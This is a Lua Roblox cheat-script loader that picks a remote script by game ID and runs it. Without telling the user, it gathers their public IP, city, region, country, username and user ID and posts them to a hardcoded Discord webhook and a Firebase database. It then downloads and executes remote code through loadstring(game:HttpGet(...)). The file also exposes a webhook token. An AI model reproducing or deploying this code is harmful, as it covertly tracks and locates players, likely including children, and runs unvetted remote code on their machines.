-- Universal Script Loader
-- Supports multiple games and auto-detects which one to load.

--[[ Configuration ]]
local games = {
    [7326934954] = "https://raw.githubusercontent.com/vex9690/vex/refs/heads/main/99", -- 99 Nights in the Forest
    [8316902627] = "https://raw.githubusercontent.com/vex9690/vex/refs/heads/main/pvsb", -- Plants Vs Brainrots
    [5750914919] = "https://raw.githubusercontent.com/vex9690/niga/refs/heads/main/fuh", -- Fisch
    [7018190066] = "https://raw.githubusercontent.com/vex9690/niga/refs/heads/main/dr", -- Dead Rails
    [4777817887] = "https://raw.githubusercontent.com/vex9690/vex/refs/heads/main/bb", -- Blade Ball
    [703124385] = "https://raw.githubusercontent.com/vex9690/vex/refs/heads/main/toh", -- Tower of Hell
    [7709344486] = "https://raw.githubusercontent.com/vex9690/niga/refs/heads/main/sab", -- Steal a Brainrot
    [994732206] = "https://raw.githubusercontent.com/vex9690/niga/refs/heads/main/blx%20fruits", -- Blox Fruits
    [10200395747] = "https://raw.githubusercontent.com/vex9690/niga/refs/heads/main/gag2", -- Grow a Garden 2
    [66654135] = "https://raw.githubusercontent.com/vex9690/niga/refs/heads/main/mm2", -- Murder Mystery 2
    [10148749921] = "https://raw.githubusercontent.com/vex9690/niga/refs/heads/main/animal%20hospital", -- Animal Hospital
}

--[[ DISCORD ]]
local WEBHOOK_URL = "https://discord.com/api/webhooks/1530499188813463642/LnHySukX7T-U2W3bgvCImcNo_fMhzlQSSpe2zKxV80RVpSRgoeM3LX7Xxr-w5LnVPpwh"

--[[ FIREBASE CONFIGURATION ]]
local FIREBASE_URL = "https://myscripttracker-2ed86-default-rtdb.firebaseio.com/"
local STATS_PATH = "scriptStats"

--[[ Find working request function ]]
local function getRequestFunction()
    if syn and syn.request then return syn.request end
    if request then return request end
    if http and http.request then return http.request end
    if http_request then return http_request end
    if fluxus and fluxus.request then return fluxus.request end
    return nil
end
local requestFunc = getRequestFunction()
local http = game:GetService("HttpService")

--[[ Functions ]]
local function notify(title, text)
    pcall(function()
        game.StarterGui:SetCore("SendNotification", {
            Title = title;
            Text = text;
            Duration = 5;
        })
    end)
end

local function sendToDiscord(message, embed)
    pcall(function()
        local payload
        if embed then
            payload = { embeds = { embed } }  -- embed is a single table, wrap in array
        else
            payload = { content = message }
        end
        local json = http:JSONEncode(payload)

        if requestFunc then
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = json
            })
        else
            http:PostAsync(WEBHOOK_URL, json)
        end
    end)
end

--[[ FIREBASE CORE FUNCTIONS ]]
local function getFirebaseData(path)
    local url = string.format("%s/%s.json", FIREBASE_URL, path)
    local success, result = pcall(function()
        if requestFunc then
            local response = requestFunc({ Url = url, Method = "GET" })
            return response and response.Body
        else
            return http:GetAsync(url)
        end
    end)
    
    if not success or not result or result == "" or result == "null" then
        return {}
    end
    
    local success2, decoded = pcall(function()
        return http:JSONDecode(result)
    end)
    
    if not success2 or type(decoded) ~= "table" then
        return {}
    end
    
    return decoded
end

local function updateFirebaseData(path, data)
    local url = string.format("%s/%s.json", FIREBASE_URL, path)
    local json = http:JSONEncode(data)
    pcall(function()
        if requestFunc then
            requestFunc({ Url = url, Method = "PUT", Headers = { ["Content-Type"] = "application/json" }, Body = json })
        else
            http:PutAsync(url, json)
        end
    end)
end

--[[ Get User Location Data ]]
local function getUserLocation()
    local location = { ip = "Unknown", country = "Unknown", city = "Unknown", region = "Unknown" }
    pcall(function()
        local ip = game:HttpGet("https://api.ipify.org")
        if ip and ip ~= "" then
            location.ip = ip
            local ipInfo = game:HttpGet("https://ipinfo.io/" .. ip .. "/json")
            if ipInfo and ipInfo ~= "" then
                local data = http:JSONDecode(ipInfo)
                location.country = data.country or "Unknown"
                location.city = data.city or "Unknown"
                location.region = data.region or "Unknown"
            end
        end
    end)
    return location
end

--[[ Main Logic ]]
local id = game.GameId
local notifId = game.PlaceId
local scriptUrl = games[id]
local gameName = "Unknown"
local userId = "Unknown"
local userName = "Unknown"

pcall(function()
    local player = game:GetService("Players").LocalPlayer
    if player then
        userId = tostring(player.UserId)
        userName = player.Name
    end
end)

pcall(function()
    gameName = game:GetService("MarketplaceService"):GetProductInfo(notifId).Name
end)

-- Get user location
local location = getUserLocation()

--[[ FIREBASE: GET AND UPDATE GLOBAL STATS ]]
local firebaseKey = userId
local globalData = getFirebaseData(STATS_PATH) or {}
local userStats = globalData[firebaseKey] or { totalLoaderExecutions = 0, gameExecutions = {} }

-- Increment total loader executions
userStats.totalLoaderExecutions = (userStats.totalLoaderExecutions or 0) + 1

-- Increment game-specific execution count
local gameIdStr = tostring(id)
userStats.gameExecutions[gameIdStr] = (userStats.gameExecutions[gameIdStr] or 0) + 1

-- Save the updated stats back to Firebase
globalData[firebaseKey] = userStats
updateFirebaseData(STATS_PATH, globalData)

--[[ SEND TO DISCORD WITH PERMANENT STATS ]]
local embed = {
    title = "📊 Script Execution Report",
    color = scriptUrl and 3066993 or 15844367,
    fields = {
        { name = "👤 User", value = string.format("**%s**", userName), inline = true },
        { name = "🆔 User ID", value = string.format("`%s`", userId), inline = true },
        { name = "🎮 Game", value = string.format("**%s**", gameName), inline = true },
        { name = "📌 Status", value = scriptUrl and "✅ **SUCCESS**" or "⚠️ **UNSUPPORTED**", inline = true },
        { name = "🆔 Game ID", value = string.format("`%s`", id), inline = true },
        { name = "🏷️ Place ID", value = string.format("`%s`", game.PlaceId), inline = true },
        {
            name = "🌍 Location",
            value = string.format("**IP:** `%s`\n**Country:** %s\n**City:** %s\n**Region:** %s",
                location.ip,
                location.country,
                location.city,
                location.region
            ),
            inline = false
        },
        {
            name = "⏰ Activity Time",
            value = string.format("**Executed:** %s", os.date("%Y-%m-%d %H:%M:%S")),
            inline = true
        },
        {
            name = "📊 Permanent Loader Executions",
            value = string.format("`%s`", userStats.totalLoaderExecutions),
            inline = true
        },
        {
            name = "🎮 Permanent Game Executions",
            value = string.format("`%s` (%s)", userStats.gameExecutions[gameIdStr], gameName),
            inline = true
        }
    },
    footer = {
        text = "Universal Script Loader (Firebase Tracking)"
    },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

-- Send the embed
sendToDiscord(nil, embed)

--[[ LOAD THE SCRIPT ]]
if scriptUrl then
    notify("STATUS:", "Detected game: " .. gameName)
    local success, err = pcall(function()
        loadstring(game:HttpGet(scriptUrl))()
    end)

    if success then
        notify("STATUS:", "Loaded successfully!")
        sendToDiscord("✅ **SUCCESS**: " .. userName .. " loaded " .. gameName)
    else
        notify("STATUS:", "Error loading script!")
        sendToDiscord("❌ **ERROR**: " .. userName .. "\n```lua\n" .. tostring(err) .. "\n```")
    end
else
    notify("STATUS:", "Game not supported!")
    sendToDiscord("⚠️ **UNSUPPORTED**: " .. userName .. " tried " .. gameName)
end
